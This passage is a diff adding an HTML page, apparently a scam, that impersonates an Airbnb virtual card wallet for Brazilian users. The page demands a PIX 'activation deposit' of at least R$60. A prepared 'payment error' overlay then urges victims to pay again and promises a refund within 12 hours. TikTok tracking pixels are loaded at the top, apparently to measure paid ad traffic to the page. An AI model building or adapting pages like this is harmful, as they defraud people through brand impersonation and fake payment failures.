@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<script>
+  window.tikTokPixelId = "69edaaffbdf66cc14237f33f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];
+  ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"];
+  ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};
+  for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);
+  ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e};
+  ttq.load=function(e,n){
+    var r="https://analytics.tiktok.com/i18n/pixel/events.js";
+    ttq._i=ttq._i||{};ttq._i[e]=[];ttq._i[e]._u=r;
+    ttq._t=ttq._t||{};ttq._t[e]=+new Date;
+    ttq._o=ttq._o||{};ttq._o[e]=n||{};
+    n=document.createElement("script");n.type="text/javascript";n.async=!0;
+    n.src=r+"?sdkid="+e+"&lib="+t;
+    e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)
+  };
+  ttq.load("D7MEITBC77U9TECL9BF0");
+  ttq.page();
+}(window, document, "ttq");
+</script>
+<!-- TikTok Pixel Code End -->
+
+
+></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Cartão Airbnb — Wallet</title>
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
+
+    <style>
+        /* =====================================================
+           DASHBOARD ORIGINAL — layout idêntico ao enviado
+           ===================================================== */
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{
+            --apple-black:#1D1D1F;--apple-blue:#0071E3;
+            --gray-100:#F5F5F7;--gray-200:#E8E8ED;--gray-300:#D2D2D7;
+            --gray-400:#86868B;--gray-500:#6E6E73;--gray-600:#424245;
+            --success:#34C759;--warning:#FF9F0A;--error:#FF3B30;--surface:#FFFFFF;
+            /* Airbnb */
+            --red:#FF385C;--red-dark:#E00B41;
+            --pix:#32BCAD;--font:'Sora',-apple-system,sans-serif;
+        }
+        body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:var(--gray-100);color:var(--apple-black);-webkit-font-smoothing:antialiased;min-height:100vh}
+        .page{max-width:520px;margin:0 auto;min-height:100vh;background:var(--gray-100);padding-bottom:80px}
+
+        /* Top Bar */
+        .top-bar{background:var(--surface);padding:12px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:0.5px solid var(--gray-200)}
+        .top-bar .time{font-size:0.8125rem;font-weight:600}
+        .top-bar .wallet-title{display:flex;align-items:center;gap:6px;font-size:0.9375rem;font-weight:600}
+        .top-bar .wallet-title svg{width:22px;height:22px}
+        .top-bar .avatar{width:28px;height:28px;border-radius:50%;background:linear-gradient(135deg,var(--red),var(--red-dark));display:flex;align-items:center;justify-content:center;font-size:0.625rem;font-weight:700;color:#fff}
+
+        /* Alert Banner */
+        .alert-banner{margin:12px 16px 0;padding:12px 14px;background:linear-gradient(135deg,rgba(255,159,10,0.1),rgba(255,59,48,0.05));border:1px solid rgba(255,159,10,0.2);border-radius:14px;display:flex;align-items:center;gap:10px;cursor:pointer;transition:transform 0.2s}
+        .alert-banner:active{transform:scale(0.98)}
+        .alert-icon{width:36px;height:36px;border-radius:10px;background:rgba(255,159,10,0.15);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .alert-icon svg{width:18px;height:18px;fill:var(--warning)}
+        .alert-text{flex:1}
+        .alert-text .at-title{font-size:0.8125rem;font-weight:600;color:var(--apple-black)}
+        .alert-text .at-desc{font-size:0.6875rem;color:var(--gray-500);margin-top:1px}
+        .alert-arrow svg{width:16px;height:16px;fill:var(--gray-400)}
+
+        /* Card Display */
+        .card-display{padding:20px 16px 16px;text-align:center}
+        .mini-card{width:280px;height:176px;margin:0 auto;border-radius:16px;position:relative;overflow:hidden;box-shadow:0 12px 40px rgba(0,0,0,0.15);cursor:pointer;transform-style:preserve-3d;transition:transform 0.3s}
+        .mini-card:hover{transform:scale(1.02)}
+        .mini-card .mc-bg{position:absolute;inset:0;transition:background 0.5s;background:linear-gradient(145deg,#FF385C,#C8003C,#8B0028)}
+        .mini-card .mc-shine{position:absolute;inset:0;background:linear-gradient(105deg,transparent 40%,rgba(255,255,255,0.12) 45%,rgba(255,255,255,0.04) 50%,transparent 55%);animation:shine 4s ease infinite}
+        .mini-card .mc-content{position:absolute;inset:0;padding:20px;display:flex;flex-direction:column;justify-content:space-between;z-index:2}
+        .mc-top{display:flex;align-items:flex-start;justify-content:space-between}
+        .mc-logo svg{width:26px;height:30px;fill:#fff;filter:drop-shadow(0 1px 2px rgba(0,0,0,0.15))}
+        .mc-chip{position:absolute;right:20px;bottom:42px;width:32px;height:24px;background:linear-gradient(135deg,#FFD700,#FFA500);border-radius:4px}
+        .mc-chip::before{content:'';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:20px;height:13px;border:1.5px solid rgba(0,0,0,.15);border-radius:2px}
+        .mc-nfc svg{width:18px;height:18px;fill:rgba(255,255,255,0.4)}
+        .mc-bottom{display:flex;align-items:flex-end;justify-content:space-between}
+        .mc-name{font-size:0.7rem;font-weight:500;letter-spacing:0.08em;text-transform:uppercase;color:rgba(255,255,255,.75)}
+        .mc-type{font-size:0.55rem;color:rgba(255,255,255,0.5);margin-top:2px}
+        .mc-brand{font-size:0.7rem;font-weight:700;font-style:italic;color:rgba(255,255,255,0.7);letter-spacing:0.02em}
+
+        /* Balance Section */
+        .balance-section{padding:0 20px 16px;text-align:center}
+        .balance-label{font-size:0.75rem;color:var(--gray-500);margin-bottom:4px}
+        .balance-value{font-size:1.75rem;font-weight:800;color:var(--apple-black)}
+        .balance-value small{font-size:0.875rem;font-weight:600;color:var(--gray-500)}
+
+        /* Quick Actions */
+        .quick-actions{display:flex;gap:10px;padding:0 16px 16px;overflow-x:auto;scrollbar-width:none}
+        .quick-actions::-webkit-scrollbar{display:none}
+        .qa-btn{flex-shrink:0;display:flex;flex-direction:column;align-items:center;gap:6px;padding:14px 18px;background:var(--surface);border-radius:14px;border:1px solid var(--gray-200);cursor:pointer;transition:all 0.2s;min-width:80px}
+        .qa-btn:hover{border-color:var(--red)}
+        .qa-btn:active{transform:scale(0.95)}
+        .qa-icon{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center}
+        .qa-icon svg{width:16px;height:16px}
+        .qa-label{font-size:0.625rem;font-weight:600;color:var(--gray-600);white-space:nowrap}
+
+        /* Tabs */
+        .tabs{display:flex;padding:0 16px;gap:4px;margin-bottom:12px}
+        .tab{flex:1;padding:10px;text-align:center;font-size:0.75rem;font-weight:600;border-radius:10px;cursor:pointer;transition:all 0.2s;color:var(--gray-500);background:transparent}
+        .tab.active{background:var(--surface);color:var(--apple-black);box-shadow:0 1px 3px rgba(0,0,0,0.08)}
+
+        /* Tab Content */
+        .tab-content{padding:0 16px}
+        .tab-panel{display:none}
+        .tab-panel.active{display:block}
+
+        /* Info Cards */
+        .info-card{background:var(--surface);border-radius:14px;padding:16px;margin-bottom:10px;border:1px solid var(--gray-200)}
+        .ic-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px}
+        .ic-title{font-size:0.8125rem;font-weight:600}
+        .ic-badge{padding:3px 8px;border-radius:6px;font-size:0.625rem;font-weight:600}
+        .ic-row{display:flex;justify-content:space-between;padding:8px 0;font-size:0.8125rem}
+        .ic-row:not(:last-child){border-bottom:1px solid var(--gray-100)}
+        .ic-row .label{color:var(--gray-500)}
+        .ic-row .value{font-weight:600}
+
+        /* Transactions */
+        .tx-item{display:flex;align-items:center;gap:12px;padding:12px;background:var(--surface);border-radius:12px;margin-bottom:8px;border:1px solid var(--gray-200)}
+        .tx-icon{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .tx-icon svg{width:18px;height:18px}
+        .tx-info{flex:1}
+        .tx-name{font-size:0.8125rem;font-weight:600}
+        .tx-date{font-size:0.6875rem;color:var(--gray-400)}
+        .tx-amount{font-size:0.875rem;font-weight:700;text-align:right}
+        .tx-cashback{font-size:0.625rem;color:var(--success);text-align:right}
+
+        /* Bottom Nav */
+        .bottom-nav{position:fixed;bottom:0;left:50%;transform:translateX(-50%);max-width:520px;width:100%;background:rgba(255,255,255,0.95);backdrop-filter:blur(20px);border-top:0.5px solid var(--gray-200);display:flex;padding:8px 0 12px;z-index:50}
+        .bn-item{flex:1;display:flex;flex-direction:column;align-items:center;gap:3px;cursor:pointer;position:relative}
+        .bn-item svg{width:22px;height:22px;fill:var(--gray-400);transition:fill 0.2s}
+        .bn-item span{font-size:0.5625rem;color:var(--gray-400);font-weight:500;transition:color 0.2s}
+        .bn-item.active svg{fill:var(--red)}
+        .bn-item.active span{color:var(--red)}
+        .bn-badge{position:absolute;top:-2px;right:calc(50% - 16px);width:8px;height:8px;border-radius:50%;background:var(--error)}
+
+        @keyframes shine{0%,100%{transform:translateX(-100%)}50%{transform:translateX(100%)}}
+        @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+
+        /* =====================================================
+           UPSELL OVERLAY — aparece sobre o dashboard
+           ===================================================== */
+        .upsell-overlay{
+            position:fixed;inset:0;z-index:200;
+            background:rgba(0,0,0,.6);backdrop-filter:blur(6px);
+            display:flex;align-items:flex-end;justify-content:center;
+        }
+        .upsell-overlay.hidden{display:none}
+        .upsell-sheet{
+            background:#fff;border-radius:24px 24px 0 0;
+            width:100%;max-width:520px;max-height:94vh;overflow-y:auto;
+            transform:translateY(0);
+            animation:slideUp .4s cubic-bezier(.32,.72,0,1);
+        }
+        @keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
+
+        .us-handle{width:36px;height:4px;background:#E0E0E0;border-radius:2px;margin:12px auto 0}
+
+        /* Cabeçalho upsell */
+        .us-head{padding:16px 20px 0;text-align:center}
+        .us-head .us-icon{width:56px;height:56px;border-radius:18px;background:linear-gradient(135deg,#FF385C,#C8003C);display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:22px;color:#fff;box-shadow:0 6px 20px rgba(255,56,92,.3)}
+        .us-head h2{font-size:1.1rem;font-weight:800;color:#1A1A1A;font-family:var(--font);margin-bottom:4px}
+        .us-head p{font-size:.78rem;color:#6A6A6A;line-height:1.5;font-family:var(--font)}
+
+        /* Aviso */
+        .us-aviso{margin:14px 20px;padding:12px 14px;background:rgba(255,149,10,.07);border:1.5px solid rgba(255,149,10,.2);border-radius:14px;display:flex;gap:10px;align-items:flex-start}
+        .us-aviso i{color:#FF9F0A;font-size:15px;margin-top:1px;flex-shrink:0}
+        .us-aviso-text{font-size:.74rem;color:#1A1A1A;line-height:1.55;font-family:var(--font)}
+        .us-aviso-text strong{color:#FF9F0A}
+
+        /* Seletor depósito */
+        .us-body{padding:0 20px 20px}
+        .us-dep-label{font-size:.68rem;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:#86868B;margin-bottom:10px;margin-top:14px}
+        .dep-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:10px}
+        .dep-opt{padding:13px 8px;border:2px solid #DDD;border-radius:14px;text-align:center;cursor:pointer;transition:.18s;background:#fff}
+        .dep-opt:active{transform:scale(.96)}
+        .dep-opt.sel{border-color:#34C759;background:rgba(52,199,89,.05)}
+        .dep-opt .dv{font-size:.95rem;font-weight:800;color:#1A1A1A}
+        .dep-opt .dt{font-size:.58rem;font-weight:600;color:#86868B;margin-top:2px}
+        .dep-opt.sel .dv{color:#34C759}
+        .dep-opt.popular .dt{color:#FF385C;font-weight:700}
+
+        .dep-custom-wrap{margin-bottom:14px}
+        .dep-custom-wrap label{display:block;font-size:.7rem;font-weight:600;color:#86868B;margin-bottom:5px;font-family:var(--font)}
+        .dep-custom-wrap input{width:100%;padding:12px 14px;border:2px solid #DDD;border-radius:12px;font-family:var(--font);font-size:.95rem;font-weight:700;color:#1A1A1A;outline:none;transition:.2s}
+        .dep-custom-wrap input:focus{border-color:#34C759}
+
+        /* Resumo */
+        .us-resumo{background:#F7F7F7;border-radius:14px;padding:14px;margin-bottom:14px}
+        .us-resumo-row{display:flex;justify-content:space-between;font-size:.8rem;padding:4px 0;font-family:var(--font)}
+        .us-resumo-row .rl{color:#6A6A6A}
+        .us-resumo-row .rv{font-weight:700}
+        .us-resumo-total{display:flex;justify-content:space-between;font-size:.95rem;font-weight:800;border-top:1.5px solid #DDD;margin-top:8px;padding-top:10px;font-family:var(--font)}
+        .us-resumo-total .rv-green{color:#34C759}
+
+        /* PIX btn */
+        .us-pix-btn{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:16px;border:none;border-radius:14px;font-size:.97rem;font-weight:700;cursor:pointer;font-family:var(--font);background:#1A1A1A;color:#fff;transition:.2s;margin-bottom:10px;position:relative;overflow:hidden}
+        .us-pix-btn:hover{opacity:.9}
+        .us-pix-btn:active{transform:scale(.98)}
+        .us-pix-btn:disabled{opacity:.5;cursor:not-allowed}
+        .us-pix-btn.loading::after{content:'';position:absolute;top:50%;left:50%;width:20px;height:20px;margin:-10px 0 0 -10px;border:3px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite}
+        .us-pix-btn.loading .pay-label{opacity:0}
+        @keyframes spin{to{transform:rotate(360deg)}}
+
+        .us-pix-method{display:flex;align-items:center;gap:10px;padding:12px;border:2px solid #32BCAD;border-radius:12px;background:rgba(50,188,173,.04);margin-bottom:12px;position:relative}
+        .us-pix-method::after{content:'✓';position:absolute;top:10px;right:12px;width:18px;height:18px;border-radius:50%;background:#32BCAD;color:#fff;font-size:.6rem;font-weight:800;display:flex;align-items:center;justify-content:center;text-align:center;line-height:18px}
+        .us-pm-icon{width:36px;height:36px;border-radius:9px;background:#32BCAD;display:flex;align-items:center;justify-content:center;font-size:16px;color:#fff;flex-shrink:0}
+        .us-pm-title{font-size:.88rem;font-weight:700;font-family:var(--font)}
+        .us-pm-desc{font-size:.68rem;color:#6A6A6A;font-family:var(--font)}
+
+        .us-benefits{display:flex;flex-direction:column;gap:6px;margin-bottom:4px}
+        .us-ben{display:flex;align-items:center;gap:8px;font-size:.73rem;color:#6A6A6A;font-family:var(--font)}
+        .us-ben i{color:#34C759;font-size:.75rem;flex-shrink:0}
+
+        /* =====================================================
+           PIX MODAL (dentro do overlay, estilo idêntico ao checkout)
+           ===================================================== */
+        .pix-overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);backdrop-filter:blur(8px);z-index:300;opacity:0;visibility:hidden;transition:.3s;display:flex;align-items:flex-end;justify-content:center}
+        .pix-overlay.open{opacity:1;visibility:visible}
+        .pix-modal{background:#fff;border-radius:22px 22px 0 0;width:100%;max-width:520px;max-height:92vh;overflow-y:auto;transform:translateY(100%);transition:transform .4s cubic-bezier(.32,.72,0,1)}
+        .pix-overlay.open .pix-modal{transform:translateY(0)}
+        .pix-handle{width:36px;height:4px;background:#DDD;border-radius:2px;margin:10px auto 0}
+        .pix-mhead{padding:14px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #DDD}
+        .pix-mhead h3{font-size:.98rem;font-weight:800;font-family:var(--font)}
+        .pix-close{width:28px;height:28px;border-radius:50%;background:#F7F7F7;border:none;cursor:pointer;font-size:13px;color:#6A6A6A}
+        .pix-mbody{padding:20px}
+        .pix-timer{display:flex;align-items:center;gap:8px;padding:10px 12px;background:rgba(255,149,10,.08);border-radius:10px;margin-bottom:18px;font-size:.8rem;font-family:var(--font)}
+        .pix-timer i{color:#FF9F0A;flex-shrink:0}
+        .ptxt{flex:1;color:#6A6A6A}
+        .ptime{font-weight:800;color:#FF9F0A;font-variant-numeric:tabular-nums}
+        .qr-wrap{display:flex;flex-direction:column;align-items:center;margin-bottom:18px}
+        .qr-box{width:210px;height:210px;padding:12px;background:#fff;border-radius:16px;border:2px solid #DDD;margin-bottom:10px;display:flex;align-items:center;justify-content:center;position:relative}
+        .qr-lbl{font-size:.72rem;color:#6A6A6A;font-family:var(--font)}
+        .qr-overlay-logo{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:40px;height:40px;background:#fff;border-radius:10px;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(0,0,0,.1)}
+        .qr-overlay-logo svg{height:22px;fill:#FF385C}
+        .copy-sec{margin-bottom:18px}
+        .copy-sec label{display:block;font-size:.72rem;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:#6A6A6A;margin-bottom:7px;font-family:var(--font)}
+        .copy-box{display:flex;gap:8px}
+        .copy-input{flex:1;padding:11px 12px;background:#F7F7F7;border:1.5px solid #DDD;border-radius:10px;font-family:monospace;font-size:.68rem;color:#1A1A1A;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;outline:none}
+        .copy-btn{padding:11px 18px;background:#1A1A1A;color:#fff;border:none;border-radius:10px;font-size:.8rem;font-weight:700;cursor:pointer;font-family:var(--font);white-space:nowrap;transition:.2s}
+        .copy-btn:active{transform:scale(.96)}
+        .copy-btn.done{background:#34C759}
+        .pix-steps{margin-bottom:18px;padding:14px;background:#F7F7F7;border-radius:14px}
+        .ps-title{font-size:.8rem;font-weight:700;margin-bottom:10px;font-family:var(--font)}
+        .ps-item{display:flex;gap:10px;margin-bottom:8px;font-size:.78rem;color:#6A6A6A;line-height:1.5;font-family:var(--font)}
+        .ps-num{width:22px;height:22px;border-radius:50%;background:#1A1A1A;color:#fff;font-size:.67rem;font-weight:800;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .pix-status{text-align:center;padding:14px;background:rgba(255,149,10,.06);border-radius:14px;margin-bottom:14px;transition:.4s}
+        .pix-status.paid{background:rgba(52,199,89,.06)}
+        .ps-icon{width:46px;height:46px;border-radius:50%;margin:0 auto 8px;display:flex;align-items:center;justify-content:center;font-size:20px}
+        .ps-icon.wait{background:rgba(255,149,10,.12);color:#FF9F0A}
+        .ps-icon.paid{background:rgba(52,199,89,.12);color:#34C759}
+        .ps-title2{font-size:.9rem;font-weight:800;margin-bottom:2px;font-family:var(--font)}
+        .ps-desc{font-size:.73rem;color:#6A6A6A;font-family:var(--font)}
+        .pulse-dot{display:inline-block;width:6px;height:6px;border-radius:50%;margin-right:4px;vertical-align:middle;animation:dp 1.5s ease infinite}
+        .pulse-dot.wait{background:#FF9F0A}
+        .pulse-dot.paid{background:#34C759}
+        @keyframes dp{0%,100%{opacity:1}50%{opacity:.3}}
+        .pix-confirm-btn{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:15px;border:none;border-radius:14px;font-size:.92rem;font-weight:700;cursor:pointer;font-family:var(--font);background:#34C759;color:#fff;transition:.2s}
+        .pix-confirm-btn:active{transform:scale(.98)}
+    </style>
+</head>
+<body>
+
+<!-- =====================================================
+     UPSELL OVERLAY — aparece antes do dashboard
+     ===================================================== -->
+<div class="upsell-overlay" id="upsellOverlay">
+    <div class="upsell-sheet">
+        <div class="us-handle"></div>
+
+        <div class="us-head">
+            <div class="us-icon">
+                <svg viewBox="0 0 1007 1080" style="width:24px;height:24px;fill:#fff"><path d="M949.278 666.715C875.957 506.859 795.615 344.664 713.713 184.809C698.893 155.177 670.813 98.2527 645.852 67.8412C609.971 24.1733 556.93 0.779785 503.109 0.779785C449.288 0.779785 396.247 24.1733 360.366 67.8412C335.406 98.2527 307.325 155.177 292.505 184.809C210.603 344.664 130.262 506.859 56.9404 666.715C47.5802 687.769 24.9598 737.675 16.3796 760.289C6.23941 787.581 0.779297 817.213 0.779297 846.845C0.779297 975.509 101.401 1079.22 235.564 1079.22C346.326 1079.22 434.468 1008.26 503.109 934.18C571.751 1008.26 659.892 1079.22 770.655 1079.22C904.817 1079.22 1006.22 975.509 1006.22 846.845C1006.22 817.213 999.979 787.581 989.839 760.289C981.259 737.675 958.638 687.769 949.278 666.715ZM503.109 810.195C447.728 738.455 396.247 649.56 396.247 577.819C396.247 506.079 446.948 470.209 503.109 470.209C559.27 470.209 610.751 508.419 610.751 577.819C610.751 647.22 558.49 738.455 503.109 810.195Z"/></svg>
+            </div>
+            <h2>Último passo — Ative seu cartão virtual!</h2>
+            <p>Seu frete foi confirmado. Agora faça o depósito<br>inicial para liberar seu cartão virtual imediatamente.</p>
+        </div>
+
+        <!-- Aviso -->
+        <div class="us-aviso">
+            <i class="fas fa-exclamation-triangle"></i>
+            <div class="us-aviso-text">
+                <strong>Atenção:</strong> Para ativar o cartão virtual e utilizá-lo agora mesmo, é necessário um <strong>depósito mínimo de R$ 60,00</strong>. Esse valor é o seu saldo — fica disponível imediatamente no cartão para uso em qualquer compra online.
+            </div>
+        </div>
+
+        <div class="us-body">
+            <!-- Seletor de valor -->
+            <div class="us-dep-label">Escolha o valor do depósito inicial:</div>
+            <div class="dep-grid">
+                <div class="dep-opt" data-v="60" onclick="selDep(60,this)">
+                    <div class="dv">R$ 60</div><div class="dt">Mínimo</div>
+                </div>
+                <div class="dep-opt popular sel" data-v="100" onclick="selDep(100,this)">
+                    <div class="dv">R$ 100</div><div class="dt">🔥 Popular</div>
+                </div>
+                <div class="dep-opt" data-v="200" onclick="selDep(200,this)">
+                    <div class="dv">R$ 200</div><div class="dt">Mais saldo</div>
+                </div>
+            </div>
+            <div class="dep-custom-wrap">
+                <label>Ou digite outro valor (mínimo R$ 60,00):</label>
+                <input type="number" id="customDep" min="60" placeholder="R$ Digite aqui..." oninput="onCustomDep(this.value)">
+            </div>
+
+            <!-- Resumo -->
+            <div class="us-resumo">
+                <div class="us-resumo-row"><span class="rl">Depósito inicial (seu saldo)</span><span class="rv" id="depDisplay" style="color:#34C759">R$ 100,00</span></div>
+                <div class="us-resumo-total"><span>Total via PIX</span><span class="rv-green" id="totalDisplay">R$ 100,00</span></div>
+            </div>
+
+            <!-- PIX method -->
+            <div class="us-pix-method">
+                <div class="us-pm-icon"><i class="fas fa-qrcode"></i></div>
+                <div>
+                    <div class="us-pm-title">PIX — Pagamento instantâneo</div>
+                    <div class="us-pm-desc">Saldo liberado em até 2 minutos</div>
+                </div>
+            </div>
+
+            <!-- Botão -->
+            <button class="us-pix-btn" id="upsellPayBtn" onclick="gerarPixDeposito()">
+                <span class="pay-label"><i class="fas fa-qrcode"></i> &nbsp;Gerar PIX — <span id="btnDepTotal">R$ 100,00</span></span>
+            </button>
+
+            <!-- Benefícios -->
+            <div class="us-benefits">
+                <div class="us-ben"><i class="fas fa-check-circle"></i> Saldo disponível instantaneamente no cartão virtual</div>
+                <div class="us-ben"><i class="fas fa-check-circle"></i> Use em qualquer compra online imediatamente</div>
+                <div class="us-ben"><i class="fas fa-check-circle"></i> Acumule cashback Airbnb em todas as compras</div>
+                <div class="us-ben"><i class="fas fa-check-circle"></i> Sem taxas ocultas — é o seu dinheiro, seu saldo</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- =====================================================
+     PIX MODAL DO DEPÓSITO
+     ===================================================== -->
+<div class="pix-overlay" id="pixOverlay">
+    <div class="pix-modal">
+        <div class="pix-handle"></div>
+        <div class="pix-mhead">
+            <h3>Pagar via PIX</h3>
+            <button class="pix-close" onclick="fecharPix()"><i class="fas fa-times"></i></button>
+        </div>
+        <div class="pix-mbody">
+            <div class="pix-timer">
+                <i class="fas fa-clock"></i>
+                <span class="ptxt">Código expira em:</span>
+                <span class="ptime" id="pixTimer">09:59</span>
+            </div>
+
+            <div style="text-align:center;margin-bottom:14px">
+                <div style="font-size:.72rem;color:#6A6A6A;font-family:var(--font)">Valor do depósito</div>
+                <div style="font-size:1.55rem;font-weight:800;color:#1A1A1A;font-family:var(--font)" id="pixAmountDisplay">R$ 100,00</div>
+                <div style="font-size:.68rem;color:#34C759;font-weight:700;font-family:var(--font)">Este valor será seu saldo no cartão</div>
+            </div>
+
+            <div class="qr-wrap">
+                <div class="qr-box">
+                    <canvas id="qrCanvas"></canvas>
+                    <div class="qr-overlay-logo">
+                        <svg viewBox="0 0 1007 1080"><path d="M949.278 666.715C875.957 506.859 795.615 344.664 713.713 184.809C698.893 155.177 670.813 98.2527 645.852 67.8412C609.971 24.1733 556.93 0.779785 503.109 0.779785C449.288 0.779785 396.247 24.1733 360.366 67.8412C335.406 98.2527 307.325 155.177 292.505 184.809C210.603 344.664 130.262 506.859 56.9404 666.715C47.5802 687.769 24.9598 737.675 16.3796 760.289C6.23941 787.581 0.779297 817.213 0.779297 846.845C0.779297 975.509 101.401 1079.22 235.564 1079.22C346.326 1079.22 434.468 1008.26 503.109 934.18C571.751 1008.26 659.892 1079.22 770.655 1079.22C904.817 1079.22 1006.22 975.509 1006.22 846.845C1006.22 817.213 999.979 787.581 989.839 760.289C981.259 737.675 958.638 687.769 949.278 666.715ZM503.109 810.195C447.728 738.455 396.247 649.56 396.247 577.819C396.247 506.079 446.948 470.209 503.109 470.209C559.27 470.209 610.751 508.419 610.751 577.819C610.751 647.22 558.49 738.455 503.109 810.195Z"/></svg>
+                    </div>
+                </div>
+                <div class="qr-lbl">Escaneie com o app do seu banco</div>
+            </div>
+
+            <div class="copy-sec">
+                <label>Código PIX — Copia e Cola</label>
+                <div class="copy-box">
+                    <input type="text" class="copy-input" id="pixCodeInput" readonly>
+                    <button class="copy-btn" id="copyBtn" onclick="copiarPix()">Copiar</button>
+                </div>
+            </div>
+
+            <div class="pix-steps">
+                <div class="ps-title">Como pagar:</div>
+                <div class="ps-item"><div class="ps-num">1</div><span>Abra o app do seu banco e acesse o <strong>PIX</strong></span></div>
+                <div class="ps-item"><div class="ps-num">2</div><span>Escolha <strong>Pix Copia e Cola</strong> ou escaneie o QR Code</span></div>
+                <div class="ps-item"><div class="ps-num">3</div><span>Confirme o valor e finalize o pagamento</span></div>
+                <div class="ps-item"><div class="ps-num">4</div><span>Seu cartão virtual será <strong>ativado automaticamente!</strong></span></div>
+            </div>
+
+            <div class="pix-status" id="pixStatus">
+                <div class="ps-icon wait"><i class="fas fa-clock"></i></div>
+                <div class="ps-title2"><span class="pulse-dot wait"></span>Aguardando pagamento</div>
+                <div class="ps-desc">O status atualiza automaticamente</div>
+            </div>
+
+            <button class="pix-confirm-btn" onclick="confirmarPago()">
+                <i class="fas fa-check"></i> Já realizei o pagamento
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- =====================================================
+     OVERLAY DE ERRO DE PAGAMENTO
+     ===================================================== -->
+<div class="upsell-overlay hidden" id="erroOverlay">
+    <div class="upsell-sheet" style="max-height:80vh">
+        <div class="us-handle"></div>
+        <div style="padding:22px 20px 28px">
+            <div style="display:flex;justify-content:center;margin-bottom:18px">
+                <div style="width:68px;height:68px;border-radius:50%;background:rgba(255,59,48,.1);border:3px solid rgba(255,59,48,.2);display:flex;align-items:center;justify-content:center;font-size:28px;color:#FF3B30;animation:errShake .5s ease .1s both">
+                    <i class="fas fa-times-circle"></i>
+                </div>
+            </div>
+            <h2 style="font-family:var(--font);font-size:1.1rem;font-weight:800;text-align:center;margin-bottom:8px;color:#1A1A1A">Erro no processamento do pagamento</h2>
+            <p style="font-family:var(--font);font-size:.8rem;color:#6A6A6A;text-align:center;line-height:1.6;margin-bottom:18px">Ocorreu um erro no processamento do seu pagamento.<br>Você precisa pagar novamente.</p>
+            <div style="display:flex;gap:12px;align-items:flex-start;padding:13px 14px;background:rgba(52,199,89,.06);border:1px solid rgba(52,199,89,.2);border-radius:14px;margin-bottom:20px">
+                <div style="width:36px;height:36px;border-radius:10px;background:rgba(52,199,89,.12);display:flex;align-items:center;justify-content:center;font-size:16px;color:#34C759;flex-shrink:0">
+                    <i class="fas fa-undo-alt"></i>
+                </div>
+                <div>
+                    <div style="font-family:var(--font);font-size:.78rem;font-weight:700;color:#1a7a38;margin-bottom:3px">Estorno automático garantido</div>
+                    <div style="font-family:var(--font);font-size:.73rem;color:#2a9148;line-height:1.5">O valor cobrado será estornado automaticamente em até <strong>12 horas</strong>. Nenhuma ação é necessária da sua parte.</div>
+                </div>
+            </div>
+            <button onclick="tentarNovamente()" style="display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:16px;border:none;border-radius:14px;font-size:.97rem;font-weight:700;cursor:pointer;font-family:var(--font);background:#FF385C;color:#fff;margin-bottom:12px;box-shadow:0 6px 20px rgba(255,56,92,.25)">
+                <i class="fas fa-redo"></i> Tentar pagar novamente
+            </button>
+            <div style="font-family:var(--font);font-size:.7rem;color:#86868B;text-align:center">Precisa de ajuda? Entre em contato com nosso suporte.</div>
+        </div>
+    </div>
+</div>
+<style>@keyframes errShake{0%,100%{transform:translateX(0)}20%{transform:translateX(-5px)}40%{transform:translateX(5px)}60%{transform:translateX(-3px)}80%{transform:translateX(3px)}}</style>
+
+<!-- =====================================================
+     DASHBOARD ORIGINAL — exibido após o depósito
+     ===================================================== -->
+<div class="page">
+    <!-- Top Bar -->
+    <div class="top-bar">
+        <div class="time" id="currentTime">00:00</div>
+        <div class="wallet-title">
